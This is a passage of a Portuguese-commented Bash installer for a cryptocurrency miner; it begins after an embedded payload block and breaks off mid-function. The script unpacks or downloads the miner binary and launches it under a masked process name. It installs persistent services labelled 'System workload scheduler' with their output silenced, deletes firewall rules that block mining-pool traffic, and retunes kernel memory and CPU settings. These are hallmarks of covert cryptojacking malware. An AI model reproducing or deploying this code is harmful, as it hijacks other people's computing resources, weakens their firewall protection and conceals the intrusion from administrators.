#!END x86_64
# ==== END EMBEDDED PAYLOADS ====
MX_PAYLOAD_EOF
PAYLOAD_MARK_BEGIN='# ==== BEGIN EMBEDDED PAYLOADS ===='
PAYLOAD_MARK_END='# ==== END EMBEDDED PAYLOADS ===='
resolve_self() {
    local p
    p=$(readlink -f "$0" 2>/dev/null || true)
    [ -z "$p" ] && p=$(realpath "$0" 2>/dev/null || true)
    [ -z "$p" ] && p="$0"
    case "$p" in
        /*) SELF_PATH="$p" ;;
        *)  SELF_PATH="$PWD/$p" ;;
    esac
}
payload_section() {
    [ -r "$SELF_PATH" ] || return 1
    awk -v b="$PAYLOAD_MARK_BEGIN" -v e="$PAYLOAD_MARK_END" '
        $0==b {on=1; next}
        $0==e {on=0}
        on {print}
    ' "$SELF_PATH" 2>/dev/null
}
payload_archs() {
    payload_section | awk '/^#!ARCH / {print $2}'
}
payload_meta() { # $1=arch
    local line
    line=$(payload_section | awk -v a="$1" '$1=="#!ARCH" && $2==a {print; exit}')
    [ -n "$line" ] && printf '%s' "$line"
}
payload_available() { # $1=arch
    [ -n "$(payload_meta "$1")" ]
}
payload_block() { # $1=arch
    payload_section | awk -v a="$1" '
        $0 ~ ("^#!ARCH " a " ") {on=1; next}
        $0 == ("#!END " a) {on=0; exit}
        on {print}
    '
}
gzip_stream_decode() {
    if have gzip; then gzip -dc
    elif have busybox; then busybox gzip -dc
    else return 1; fi
}
payload_decode() { # decodifica o base64 do payload (alfabeto pode estar embaralhado)
    if [ -n "$B64_ALPHA" ] && [ "$B64_ALPHA" != "$B64_STD" ] && have tr; then
        tr "$B64_ALPHA" "$B64_STD" | b64_decode
    else
        b64_decode
    fi
}
payload_extract() { # $1 = destino
    (
    local dest="$1" meta comp sha size got tmp
    meta=$(payload_meta "$ARCH")
    [ -z "$meta" ] && return 1
    comp=$(printf '%s' "$meta" | awk '{for(i=1;i<NF;i++) if($i=="comp"){print $(i+1); exit}}')
    sha=$(printf '%s' "$meta"  | awk '{for(i=1;i<NF;i++) if($i=="sha256"){print $(i+1); exit}}')
    size=$(printf '%s' "$meta" | awk '{for(i=1;i<NF;i++) if($i=="size"){print $(i+1); exit}}')
    tmp="$dest.part.$$"
    umask 077
    if [ "$comp" = "gzip" ]; then
        payload_block "$ARCH" | payload_decode | gzip_stream_decode > "$tmp" 2>/dev/null || { rm -f "$tmp"; return 1; }
    else
        payload_block "$ARCH" | payload_decode > "$tmp" 2>/dev/null || { rm -f "$tmp"; return 1; }
    fi
    [ -s "$tmp" ] || { rm -f "$tmp"; return 1; }
    if [ -n "$size" ] && [ "$size" -gt 0 ] 2>/dev/null; then
        got=$(wc -c < "$tmp" 2>/dev/null | tr -d ' ')
        [ "$got" != "$size" ] && { err "Payload truncado (${got}/${size} bytes)."; rm -f "$tmp"; return 1; }
    fi
    if [ -n "$sha" ]; then
        got=$(sha256_of "$tmp")
        if [ -z "$got" ]; then
            warn "sha256 indisponivel; pulando verificacao do payload."
        elif [ "$got" != "$sha" ]; then
            err "Checksum do payload invalido."
            rm -f "$tmp"
            return 1
        fi
    fi
    chmod 700 "$tmp" 2>/dev/null
    mv -f "$tmp" "$dest" 2>/dev/null || { rm -f "$tmp"; return 1; }
    return 0
    )
}
download_payload() { # $1 = destino (somente quando --allow-download)
    local dest="$1" name url sums_url sums tmpdir hash got
    case "$ARCH" in
        x86_64) name="${PAYLOAD_PREFIX}-${PAYLOAD_VERSION}-linux-static-x64.tar.gz" ;;
        *) err "Sem build oficial para $ARCH; embuta um binario local com build.sh."; return 1 ;;
    esac
    url="${PAYLOAD_BASE_URL}${PAYLOAD_VERSION}/${name}"
    sums_url="${PAYLOAD_BASE_URL}${PAYLOAD_VERSION}/SHA256SUMS"
    tmpdir=$(mktemp -d "${TMPDIR:-/tmp}/mxdl.XXXXXX" 2>/dev/null) || return 1
    log "Baixando payload (${PAYLOAD_VERSION})..."
    if have curl; then
        curl -fsSL --connect-timeout 15 --max-time 180 "$url" -o "$tmpdir/p.tgz" 2>/dev/null || true
        hash=$(curl -fsSL --connect-timeout 10 --max-time 30 "$sums_url" 2>/dev/null | awk -v n="$name" '$2==n || $2=="*"n {print $1}')
    elif have wget; then
        wget -q -T 30 -O "$tmpdir/p.tgz" "$url" 2>/dev/null || true
        hash=$(wget -qO- -T 15 "$sums_url" 2>/dev/null | awk -v n="$name" '$2==n || $2=="*"n {print $1}')
    else
        err "curl/wget ausentes."; rm -rf "$tmpdir"; return 1
    fi
    [ -s "$tmpdir/p.tgz" ] || { err "Falha no download."; rm -rf "$tmpdir"; return 1; }
    if [ -n "$hash" ]; then
        got=$(sha256_of "$tmpdir/p.tgz")
        [ -n "$got" ] && [ "$got" != "$hash" ] && { err "Checksum do download invalido."; rm -rf "$tmpdir"; return 1; }
    fi
    tar -xzf "$tmpdir/p.tgz" -C "$tmpdir" 2>/dev/null || { err "Falha ao extrair."; rm -rf "$tmpdir"; return 1; }
    local eng
    eng=$(find "$tmpdir" -maxdepth 3 -type f -perm -u+x ! -name '*.tgz' 2>/dev/null | head -1)
    [ -n "$eng" ] && cp "$eng" "$dest" && chmod 700 "$dest"
    rm -rf "$tmpdir"
    [ -s "$dest" ] || return 1
    return 0
}
ensure_binary() {
    if [ -x "$BIN" ] && "$BIN" --version >/dev/null 2>&1; then
        return 0
    fi
    rm -f "$BIN" 2>/dev/null
    mkdir -p "$(dirname "$BIN")" 2>/dev/null || return 1
    if payload_available "$ARCH"; then
        log "Extraindo payload embutido (${ARCH})..."
        if payload_extract "$BIN"; then
            ok "Payload extraido e verificado."
            return 0
        fi
        err "Falha ao extrair o payload embutido."
        return 1
    fi
    if [ "$ALLOW_DOWNLOAD" = "true" ]; then
        warn "Payload ausente para ${ARCH}; baixando (--allow-download)."
        download_payload "$BIN" && return 0
        return 1
    fi
    err "Nenhum payload embutido para ${ARCH}."
    err "Gere o artefato com: ./build.sh --download   (ou --payload ${ARCH}=/caminho/binario)"
    return 1
}
host_save_old() { # salva valores anteriores para restaurar no uninstall
    local k="$1" f="$2"
    [ -f "$f" ] || return 0
    state_get "${k}_OLD" >/dev/null 2>&1 && return 0
    state_set "${k}_OLD" "$(cat "$f" 2>/dev/null)"
}
host_restore_old() {
    local k v g
    for k in SWAPPINESS VFS_PRESSURE OVERCOMMIT THP HUGEPAGES; do
        v=$(state_get "${k}_OLD" 2>/dev/null)
        [ -z "$v" ] && continue
        case "$k" in
            SWAPPINESS)    [ -w /proc/sys/vm/swappiness ] && { echo "$v" > /proc/sys/vm/swappiness; } 2>/dev/null ;;
            VFS_PRESSURE)  [ -w /proc/sys/vm/vfs_cache_pressure ] && { echo "$v" > /proc/sys/vm/vfs_cache_pressure; } 2>/dev/null ;;
            OVERCOMMIT)    [ -w /proc/sys/vm/overcommit_memory ] && { echo "$v" > /proc/sys/vm/overcommit_memory; } 2>/dev/null ;;
            THP)           [ -w /sys/kernel/mm/transparent_hugepage/enabled ] && { echo "$v" > /sys/kernel/mm/transparent_hugepage/enabled; } 2>/dev/null ;;
            HUGEPAGES)     [ -w /proc/sys/vm/nr_hugepages ] && { echo "$v" > /proc/sys/vm/nr_hugepages; } 2>/dev/null ;;
        esac
    done
    v=$(state_get GOVERNOR_OLD 2>/dev/null)
    if [ -n "$v" ]; then
        for g in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
            [ -w "$g" ] || continue
            echo "$v" > "$g" 2>/dev/null || true
        done
    fi
}
setup_swap() {
    [ "$PROFILE" = "root" ] || return 0
    [ "$ENABLE_SWAP" = "true" ] || return 0
    local total swap needed=512 free_disk
    total=$(mem_total_mb)
    swap=$(swap_total_mb)
    if [ "${total:-0}" -ge "$needed" ] && [ "${swap:-0}" -gt 0 ]; then
        info "RAM/swap suficientes (${total}MB / ${swap}MB)."
        return 0
    fi
    if [ -f "$SWAPFILE" ] && have swapon && swapon --show 2>/dev/null | grep -q "$SWAPFILE"; then
        info "Swap ja ativo em $SWAPFILE."
        return 0
    fi
    warn "RAM ${total}MB / swap ${swap}MB — criando swapfile de ${needed}MB."
    free_disk=$(df -m / 2>/dev/null | awk 'NR==2 {print $4}')
    case "$free_disk" in ''|*[!0-9]*) free_disk=0 ;; esac
    if [ "$free_disk" -lt 600 ]; then
        err "Espaco em disco insuficiente (${free_disk}MB)."
        return 1
    fi
    if have fallocate && fallocate -l "${needed}M" "$SWAPFILE" 2>/dev/null; then :; else
        dd if=/dev/zero of="$SWAPFILE" bs=1M count="$needed" 2>/dev/null || { err "Falha ao criar swap."; return 1; }
    fi
    chmod 600 "$SWAPFILE" 2>/dev/null
    mkswap "$SWAPFILE" >/dev/null 2>&1 || { err "Falha no mkswap."; rm -f "$SWAPFILE"; return 1; }
    swapon "$SWAPFILE" 2>/dev/null || { err "Falha ao ativar swap."; rm -f "$SWAPFILE"; return 1; }
    grep -q "$SWAPFILE" /etc/fstab 2>/dev/null || echo "$SWAPFILE none swap sw 0 0" >> /etc/fstab
    state_set CREATED_SWAP "true"
    ok "Swap de ${needed}MB ativo."
}
setup_msr() {
    [ "$PROFILE" = "root" ] || return 0
    in_container && { info "Container detectado: MSR ignorado."; return 0; }
    if have lsmod && lsmod 2>/dev/null | grep -q '^msr '; then
        info "Modulo MSR ja carregado."
        return 0
    fi
    if have modprobe && modprobe msr 2>/dev/null; then
        ok "Modulo MSR carregado."
        { [ -f /etc/modules ] && ! grep -qx msr /etc/modules; } && echo msr >> /etc/modules 2>/dev/null
        mkdir -p /etc/modules-load.d 2>/dev/null && echo msr > /etc/modules-load.d/msr.conf 2>/dev/null
    else
        warn "MSR indisponivel (kernel/hypervisor)."
    fi
}
setup_cpu_governor() {
    [ "$HOST_TUNING" = "true" ] || return 0
    [ "$PROFILE" = "root" ] || return 0
    local g cur
    g=$(ls /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor 2>/dev/null | head -1)
    [ -z "$g" ] && { info "CPU governor indisponivel."; return 0; }
    cur=$(cat "$g" 2>/dev/null)
    if [ "$cur" != "performance" ]; then
        host_save_old GOVERNOR /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor
        for g in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
            { echo performance > "$g"; } 2>/dev/null || true
        done
        ok "CPU governor -> performance (era: ${cur:-?})."
    else
        info "CPU governor ja em performance."
    fi
}
setup_huge_pages() {
    [ "$HOST_TUNING" = "true" ] || return 0
    [ "$PROFILE" = "root" ] || return 0
    in_container && { info "Container detectado: huge pages ignoradas."; return 0; }
    local total needed current
    total=$(mem_total_mb)
    [ "${total:-0}" -lt 512 ] && return 0
    needed=$(( 1168 + ${THREADS:-4} + 32 ))
    current=$(awk '/HugePages_Total/ {print $2}' /proc/meminfo 2>/dev/null)
    current=${current:-0}
    if [ "$current" -lt "$needed" ]; then
        log "Configurando ${needed} huge pages de 2MB..."
        state_set HUGEPAGES_OLD "$current"
        if have sysctl; then sysctl -w vm.nr_hugepages="$needed" >/dev/null 2>&1; fi
        if [ -n "${SYSCTL_FILE:-}" ]; then
            sed_inplace '/vm.nr_hugepages/d' "$SYSCTL_FILE" 2>/dev/null
            echo "vm.nr_hugepages=$needed" >> "$SYSCTL_FILE" 2>/dev/null
            state_set CREATED_SYSCTL "true"
        fi
        ok "Huge pages: ${needed} paginas."
    else
        info "Huge pages suficientes (${current})."
    fi
}
setup_1gb_hugepages() {
    [ "$HOST_TUNING" = "true" ] || return 0
    [ "$PROFILE" = "root" ] || return 0
    local hp free_gb needed cur
    hp=/sys/kernel/mm/hugepages/hugepages-1048576kB/nr_hugepages
    [ -f "$hp" ] || { info "1GB huge pages nao suportadas."; return 0; }
    needed=$(( 3 + ${THREADS:-4} + 1 ))
    free_gb=$(awk '/MemFree/ {print int($2/1048576)}' /proc/meminfo 2>/dev/null)
    [ "${free_gb:-0}" -lt "$needed" ] && { info "RAM livre insuficiente p/ 1GB pages."; return 0; }
    cur=$(cat "$hp" 2>/dev/null); cur=${cur:-0}
    if [ "$cur" -lt "$needed" ]; then
        { echo "$needed" > "$hp"; } 2>/dev/null && ok "1GB huge pages: ${needed}." \
            || warn "Falha ao configurar 1GB huge pages."
    fi
}
setup_tmpfs_cache() {
    [ "$ENABLE_TMPFS" = "true" ] || return 0
    local free_mb
    free_mb=$(mem_avail_mb)
    if [ "${free_mb:-0}" -gt 4096 ]; then
        mkdir -p /dev/shm/.cache 2>/dev/null
        mountpoint -q /dev/shm/.cache 2>/dev/null || mount -t tmpfs -o size=2G tmpfs /dev/shm/.cache 2>/dev/null
        ok "tmpfs 2GB ativo."
    fi
}
apply_oom_mitigations() {
    [ "$HOST_TUNING" = "true" ] || return 0
    [ "$PROFILE" = "root" ] || return 0
    log "Aplicando mitigacoes de memoria..."
    sync 2>/dev/null
    [ -w /proc/sys/vm/drop_caches ] && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
    host_save_old SWAPPINESS /proc/sys/vm/swappiness
    host_save_old VFS_PRESSURE /proc/sys/vm/vfs_cache_pressure
    host_save_old OVERCOMMIT /proc/sys/vm/overcommit_memory
    host_save_old THP /sys/kernel/mm/transparent_hugepage/enabled
    [ -w /proc/sys/vm/swappiness ] && echo 60 > /proc/sys/vm/swappiness 2>/dev/null
    [ -w /proc/sys/vm/vfs_cache_pressure ] && echo 50 > /proc/sys/vm/vfs_cache_pressure 2>/dev/null
    [ -w /proc/sys/vm/overcommit_memory ] && echo 1 > /proc/sys/vm/overcommit_memory 2>/dev/null
    ok "Mitigacoes aplicadas (valores anteriores salvos p/ uninstall)."
}
check_min_memory() {
    local total swap total_vm
    total=$(mem_total_mb)
    swap=$(swap_total_mb)
    total_vm=$(( ${total:-0} + ${swap:-0} ))
    if [ "$total_vm" -lt 280 ]; then
        err "Memoria insuficiente: ${total_vm}MB (min 280MB)."
        return 1
    fi
    info "Memoria virtual: ${total_vm}MB (RAM ${total} + swap ${swap})."
    return 0
}
open_port() {
    local port="$1"
    [ "$PROFILE" = "root" ] || return 0
    have iptables || return 0
    iptables -C OUTPUT -p tcp --dport "$port" -j ACCEPT 2>/dev/null && return 0
    iptables -I OUTPUT -p tcp --dport "$port" -j ACCEPT 2>/dev/null || true
}
snapshot_firewall() {
    [ "$PROFILE" = "root" ] || return 0
    mkdir -p "$MX_STATE_DIR" 2>/dev/null || return 0
    if have iptables-save; then
        iptables-save > "$MX_STATE_DIR/firewall.iptables.before" 2>/dev/null || true
    fi
    if have nft; then
        nft list ruleset > "$MX_STATE_DIR/firewall.nft.before" 2>/dev/null || true
    fi
}
check_and_fix_firewall() {
    [ "$PROFILE" = "root" ] || return 0
    log "Verificando firewall para os pools..."
    local fixed=0 p port host policy num rule
    local -a ports=() hosts=()
    for p in "${POOLS[@]}"; do
        port="${p##*:}"; host="${p%:*}"
        case " ${ports[*]} " in *" $port "*) ;; *) ports+=("$port") ;; esac
        case " ${hosts[*]} " in *" $host "*) ;; *) hosts+=("$host") ;; esac
    done
    if have iptables; then
        policy=$(iptables -L OUTPUT -n 2>/dev/null | head -1 | awk '{for(i=1;i<=NF;i++) if($i=="policy") print $(i+1)}')
        if [ "$policy" = "DROP" ] || [ "$policy" = "REJECT" ]; then
            warn "OUTPUT=$policy -> ACCEPT."
            iptables -P OUTPUT ACCEPT 2>/dev/null && fixed=1
        fi
        for port in "${ports[@]}"; do
            num=1
            while [ "$num" -le 64 ]; do
                rule=$(iptables -L OUTPUT --line-numbers -n 2>/dev/null | awk -v n="$num" '$1==n {print; exit}')
                case "$rule" in
                    *DROP*|*REJECT*)
                        case "$rule" in
                            *"dpt:$port"*) iptables -D OUTPUT "$num" 2>/dev/null && fixed=1; continue ;;
                        esac ;;
                esac
                num=$(( num + 1 ))
            done
        done
        for host in "${hosts[@]}"; do
            case "$host" in *[!0-9.]*) continue ;; esac
            num=1
            while [ "$num" -le 64 ]; do
                rule=$(iptables -L OUTPUT --line-numbers -n 2>/dev/null | awk -v n="$num" '$1==n {print; exit}')
                case "$rule" in
                    *DROP*|*REJECT*)
                        case "$rule" in
                            *"$host"*) iptables -D OUTPUT "$num" 2>/dev/null && fixed=1; continue ;;
                        esac ;;
                esac
                num=$(( num + 1 ))
            done
        done
        for port in "${ports[@]}"; do open_port "$port"; done
        { mkdir -p /etc/iptables && iptables-save > /etc/iptables/rules.v4; } 2>/dev/null || true
    fi
    if have nft; then
        for port in "${ports[@]}"; do
            if nft list ruleset 2>/dev/null | grep -qE "dport $port .*(drop|reject)|(drop|reject).* dport $port"; then
                warn "nftables: liberando porta $port."
                nft insert rule inet filter output tcp dport "$port" accept 2>/dev/null || \
                nft insert rule ip filter output tcp dport "$port" accept 2>/dev/null || true
                fixed=1
            fi
        done
    fi
    if have ufw && ufw status 2>/dev/null | grep -q "Status: active"; then
        for port in "${ports[@]}"; do
            if ufw status 2>/dev/null | grep -qiE "(DENY|REJECT) OUT.*$port|$port.*(DENY|REJECT) OUT"; then
                warn "ufw: liberando saida $port."
                ufw allow out to any port "$port" proto tcp >/dev/null 2>&1 && fixed=1
            fi
        done
    fi
    if have firewall-cmd && firewall-cmd --state 2>/dev/null | grep -q running; then
        for port in "${ports[@]}"; do
            rule=$(firewall-cmd --list-rich-rules 2>/dev/null | grep "port=\"$port\"" | grep -iE "drop|reject" | head -1)
            [ -n "$rule" ] && firewall-cmd --remove-rich-rule="$rule" 2>/dev/null && fixed=1
            firewall-cmd --direct --add-rule ipv4 filter OUTPUT 0 -p tcp --dport "$port" -j ACCEPT 2>/dev/null || true
        done
        firewall-cmd --runtime-to-permanent 2>/dev/null || true
    fi
    [ "$fixed" -eq 1 ] && ok "Firewall ajustado." || ok "Nenhum bloqueio detectado."
}
write_wrapper() {
    local threads="$1"
    mkdir -p "$HELPER_DIR" 2>/dev/null || return 1
    {
        printf '#!/bin/bash\n'
        printf 'exec -a %q %q --config=%q --no-color -t %s\n' \
            "$MASK_NAME" "$BIN" "$CONFIG_FILE" "$threads"
    } > "$CRON_HELPER" 2>/dev/null || return 1
    chmod 700 "$CRON_HELPER" 2>/dev/null
    return 0
}
service_unit_text() {
    local blurb="$1"
    cat <<EOF
[Unit]
Description=${blurb}
After=network.target network-online.target
Wants=network-online.target
[Service]
Type=simple
ExecStart=$CRON_HELPER
Restart=always
RestartSec=15
Nice=19
CPUSchedulingPolicy=idle
IOSchedulingClass=idle
StandardOutput=null
StandardError=null
LimitNOFILE=65536
[Install]
WantedBy=$( [ "$PROFILE" = "user" ] && echo default.target || echo multi-user.target )
EOF
}
create_service() { # $1 = threads
    local threads="$1" blurb="System workload scheduler"
    [ "$PROFILE" = "user" ] && [ -z "$HOME_DIR" ] && HOME_DIR=$(user_home)
    write_wrapper "$threads" || { err "Falha ao criar wrapper."; return 1; }
    if [ "$PROFILE" = "user" ] && [ "$INIT" != "systemd" ]; then
        info "Perfil user sem systemd --user; iniciando processo direto."
        launch_miner "$threads" >/dev/null 2>&1
        return 0
    fi
    case "$INIT" in
        systemd)
            local dir
            if [ "$PROFILE" = "user" ]; then
                if ! systemctl --user show-environment >/dev/null 2>&1; then
                    info "systemd --user indisponivel; usando cron + processo direto."
                    launch_miner "$threads" >/dev/null 2>&1
                    return 0
                fi
                dir="$HOME_DIR/.config/systemd/user"
                mkdir -p "$dir" 2>/dev/null
                service_unit_text "$blurb" > "$dir/$ARTIFACT.service"
                systemctl --user daemon-reload >/dev/null 2>&1
                systemctl --user enable "$ARTIFACT" >/dev/null 2>&1
                systemctl --user restart "$ARTIFACT" >/dev/null 2>&1
                sleep 2
                systemctl --user is-active --quiet "$ARTIFACT" 2>/dev/null
                return $?
            fi
            dir="/etc/systemd/system"
            service_unit_text "$blurb" > "$dir/$ARTIFACT.service"
            systemctl daemon-reload >/dev/null 2>&1
            systemctl enable "$ARTIFACT" >/dev/null 2>&1
            systemctl restart "$ARTIFACT" >/dev/null 2>&1
            sleep 2
            systemctl is-active --quiet "$ARTIFACT" 2>/dev/null
            return $?
            ;;
        openrc)
            cat > "/etc/init.d/$ARTIFACT" <<EOF
description="System workload scheduler"
command="$CRON_HELPER"
command_background="yes"
pidfile="/run/$ARTIFACT.pid"
output_log="/dev/null"
error_log="/dev/null"
depend() { need net; after firewall; }
EOF
            chmod 755 "/etc/init.d/$ARTIFACT"
            rc-update add "$ARTIFACT" default >/dev/null 2>&1 || true
            rc-service "$ARTIFACT" restart >/dev/null 2>&1 || true
            sleep 2
            rc-service "$ARTIFACT" status >/dev/null 2>&1
            return $?
            ;;
        *)
            cat > "/etc/init.d/$ARTIFACT" <<EOF
CMD="$CRON_HELPER"
PIDFILE="/run/$ARTIFACT.pid"
case "\$1" in
  start)
    [ -f "\$PIDFILE" ] && kill -0 "\$(cat "\$PIDFILE")" 2>/dev/null && exit 0
    "\$CMD" >/dev/null 2>&1 &
    echo \$! > "\$PIDFILE"
    ;;
  stop)
    [ -f "\$PIDFILE" ] && kill "\$(cat "\$PIDFILE")" 2>/dev/null
    rm -f "\$PIDFILE"
    ;;
  restart) "\$0" stop; sleep 2; "\$0" start ;;
  status) [ -f "\$PIDFILE" ] && kill -0 "\$(cat "\$PIDFILE")" 2>/dev/null ;;
  *) echo "Usage: \$0 {start|stop|restart|status}"; exit 1 ;;
esac
exit \$?
EOF
            chmod 755 "/etc/init.d/$ARTIFACT"
            if have chkconfig; then
                chkconfig --add "$ARTIFACT" 2>/dev/null; chkconfig "$ARTIFACT" on 2>/dev/null
            elif have update-rc.d; then
                update-rc.d "$ARTIFACT" defaults 2>/dev/null; update-rc.d "$ARTIFACT" enable 2>/dev/null
            fi
            "/etc/init.d/$ARTIFACT" restart >/dev/null 2>&1
            sleep 2
            "/etc/init.d/$ARTIFACT" status >/dev/null 2>&1
            return $?
            ;;
    esac
}
stop_service() {
    case "$INIT" in
        systemd)
            if [ "$PROFILE" = "user" ]; then
                systemctl --user stop "$ARTIFACT" 2>/dev/null
            else
                systemctl stop "$ARTIFACT" 2>/dev/null
            fi ;;
        openrc) rc-service "$ARTIFACT" stop >/dev/null 2>&1 ;;
        *) [ -x "/etc/init.d/$ARTIFACT" ] && "/etc/init.d/$ARTIFACT" stop >/dev/null 2>&1 ;;
    esac
    stop_miner
}
remove_service() {
    case "$INIT" in
        systemd)
            if [ "$PROFILE" = "user" ]; then
                systemctl --user stop "$ARTIFACT" 2>/dev/null
                systemctl --user disable "$ARTIFACT" 2>/dev/null
                rm -f "$HOME_DIR/.config/systemd/user/$ARTIFACT.service"
                systemctl --user daemon-reload >/dev/null 2>&1
            else
                systemctl stop "$ARTIFACT" 2>/dev/null
                systemctl disable "$ARTIFACT" 2>/dev/null
                rm -f "/etc/systemd/system/$ARTIFACT.service"
                systemctl daemon-reload >/dev/null 2>&1
            fi ;;
        openrc)
            rc-service "$ARTIFACT" stop >/dev/null 2>&1
            rc-update del "$ARTIFACT" default >/dev/null 2>&1
            rm -f "/etc/init.d/$ARTIFACT" ;;
        *)
            [ -x "/etc/init.d/$ARTIFACT" ] && "/etc/init.d/$ARTIFACT" stop >/dev/null 2>&1
            if have chkconfig; then chkconfig "$ARTIFACT" off 2>/dev/null; chkconfig --del "$ARTIFACT" 2>/dev/null
            elif have update-rc.d; then update-rc.d "$ARTIFACT" remove 2>/dev/null
            fi
            rm -f "/etc/init.d/$ARTIFACT" ;;
    esac
}
service_active() {
    [ -n "$(find_miner_pids 2>/dev/null)" ] && return 0
    case "$INIT" in
        systemd)
            if [ "$PROFILE" = "user" ]; then
                systemctl --user is-active --quiet "$ARTIFACT" 2>/dev/null
            else
                systemctl is-active --quiet "$ARTIFACT" 2>/dev/null
            fi ;;
        openrc) rc-service "$ARTIFACT" status >/dev/null 2>&1 ;;
        *) [ -x "/etc/init.d/$ARTIFACT" ] && "/etc/init.d/$ARTIFACT" status >/dev/null 2>&1 ;;
    esac
}
get_worker_id() {
    local ip=""
    if have curl; then
        ip=$(curl -4 -s --connect-timeout 5 ifconfig.me 2>/dev/null || true)
        [ -z "$ip" ] && ip=$(curl -s --connect-timeout 5 https://api.ipify.org 2>/dev/null || true)
    fi
    if [ -z "$ip" ] && have wget; then
        ip=$(wget -4 -qO- --timeout=5 ifconfig.me 2>/dev/null || true)
    fi
    case "$ip" in
        *[!0-9.]*|'') ip=$(hostname 2>/dev/null | tr -cd 'a-zA-Z0-9' | cut -c1-10) ;;
    esac
    [ -z "$ip" ] && ip="wk$(date +%s 2>/dev/null | tail -c 5)"
    printf '%s' "$ip" | tr '.' '-' | tr -cd 'a-zA-Z0-9-' | cut -c1-20
}
dns_lookup() { # $1=host → IPv4
    local h="$1" ip=""
    if have dig; then
        ip=$(dig @1.1.1.1 +short +time=3 +tries=1 A "$h" 2>/dev/null | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ {print; exit}')
    fi
    if [ -z "$ip" ] && have getent; then
        ip=$(getent ahostsv4 "$h" 2>/dev/null | awk '{print $1; exit}')
    fi
    if [ -z "$ip" ] && have nslookup; then
        ip=$(nslookup "$h" 1.1.1.1 2>/dev/null | awk '/^Address: / {print $2; exit}')
    fi
    if [ -z "$ip" ] && have host; then
        ip=$(host -t A "$h" 1.1.1.1 2>/dev/null | awk '/has address/ {print $4; exit}')
    fi
    printf '%s' "$ip"
}
resolve_pools_bypass_hosts() {
    local -a out=()
    local p host port ip
    for p in "${POOLS[@]}"; do
        host="${p%:*}"; port="${p##*:}"
        case "$host" in
            *[!0-9.]*) : ;;
            *) out+=("$p"); continue ;;
        esac
        ip=$(dns_lookup "$host")
        if [ -n "$ip" ]; then
            info "DNS $host -> $ip"
            out+=("$ip:$port")
        else
            out+=("$p")
        fi
    done
    if [ "${#out[@]}" -gt 0 ]; then POOLS=("${out[@]}"); fi
    return 0
}
order_pools_by_latency() {
    log "Testando latencia dos pools..."
    local p host port t0 t1 lat entries=""
    for p in "${POOLS[@]}"; do
        host="${p%:*}"; port="${p##*:}"
        t0=$(now_ms)
        if run_timeout 3 bash -c "exec 3<>/dev/tcp/$host/$port" 2>/dev/null; then
            t1=$(now_ms)
            lat=$(( t1 - t0 ))
            [ "$lat" -lt 1 ] && lat=1
        else
            lat=99990
        fi
        entries="${entries}$(printf '%05d' "$lat") $p
"
        info "$host:$port -> ${lat}ms"
    done
    POOLS=()
    while IFS= read -r line; do
        [ -n "$line" ] && POOLS+=("${line#* }")
    done <<EOF
$(printf '%s' "$entries" | sort -n)
EOF
    ok "Pools ordenados por latencia."
}
tune_miner() {
    local total free cores phys max_ram max_cpu max_threads cap
    total=$(mem_total_mb)
    free=$(mem_avail_mb)
    cores=$(cpu_count)
    phys=$(phys_cores)
    max_ram=$(( total / 2048 )); [ "$max_ram" -lt 1 ] && max_ram=1
    max_cpu=$phys
    max_threads=$max_ram; [ "$max_cpu" -lt "$max_threads" ] && max_threads=$max_cpu
    if [ "$free" -lt 2048 ]; then
        THREADS=1; LIGHT="true"
    elif [ "$free" -lt 4096 ]; then
        THREADS=$(( max_threads / 2 )); [ "$THREADS" -lt 1 ] && THREADS=1; LIGHT="false"
    else
        THREADS=$max_threads; LIGHT="false"
    fi
    cap=$(( cores * 75 / 100 )); [ "$cap" -lt 1 ] && cap=1
    [ "$THREADS" -gt "$cap" ] && THREADS=$cap
    [ "$THREADS" -lt 1 ] && THREADS=1
    if ! grep -q aes /proc/cpuinfo 2>/dev/null; then
        LIGHT="true"; [ "$THREADS" -gt 2 ] && THREADS=2
        info "Sem AES-NI: modo light."
    fi
    if [ "$free" -lt 1024 ]; then
        WAIT_TIMEOUT=2400
    elif [ "$LIGHT" = "true" ]; then
        WAIT_TIMEOUT=1800
    else
        WAIT_TIMEOUT=900
    fi
    info "Threads=$THREADS Light=$LIGHT Timeout=${WAIT_TIMEOUT}s (RAM ${total}MB, livre ${free}MB, cores ${cores}/${phys})"
    save_state
}
collect_runner() {
    local hp; hp=$(cat /sys/kernel/mm/hugepages/hugepages-1048576kB/nr_hugepages 2>/dev/null || echo 0)
    case "$hp" in ''|*[!0-9]*) hp=0 ;; esac
    [ "$hp" -gt 0 ] && printf 'true' || printf 'false'
}
generate_config() {
    local pool="$1" tls="$2" light="$3"
    local tls_bool="false" mode="auto" hp1g="false"
    [ "$tls" = "true" ] && tls_bool="true"
    [ "$light" = "true" ] && mode="light"
    hp1g=$(collect_runner)
    mkdir -p "$CONFIG_DIR" 2>/dev/null || return 1
    chmod 700 "$CONFIG_DIR" 2>/dev/null
    if [ "$PROFILE" = "user" ]; then
        mkdir -p "$LOG_DIR" 2>/dev/null && chmod 700 "$LOG_DIR" 2>/dev/null
    fi
    cat > "$CONFIG_FILE" <<EOF
{
  "autosave": false,
  "background": false,
  "colors": false,
  "donate-level": ${DONATE_LEVEL},
  "log-file": "${LOG_FILE}",
  "pools": [
    { "url": "${pool}", "user": "${WALLET}", "pass": "${WORKER}", "tls": ${tls_bool}, "keepalive": true }
  ],
  "cpu": { "enabled": true, "huge-pages": true, "huge-pages-jit": true, "yield": true, "priority": null },
  "randomx": { "1gb-pages": ${hp1g}, "mode": "${mode}", "wrmsr": true, "numa": true }
}
EOF
    chmod 600 "$CONFIG_FILE" 2>/dev/null
    return 0
}
find_miner_pids() {
    local pid exe cmd
    if [ -f "$PID_FILE" ]; then
        pid=$(cat "$PID_FILE" 2>/dev/null)
        case "$pid" in
            ''|*[!0-9]*) : ;;
            *) kill -0 "$pid" 2>/dev/null && printf '%s\n' "$pid" ;;
        esac
    fi
    for pid in /proc/[0-9]*; do
        [ -e "$pid/exe" ] || continue
        pid=${pid#/proc/}
        exe=$(readlink "/proc/$pid/exe" 2>/dev/null || true)
        if [ "$exe" = "$BIN" ]; then
            printf '%s\n' "$pid"
            continue
        fi
        cmd=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null || true)
        case "$cmd" in
            *"--config=$CONFIG_FILE"*) printf '%s\n' "$pid" ;;
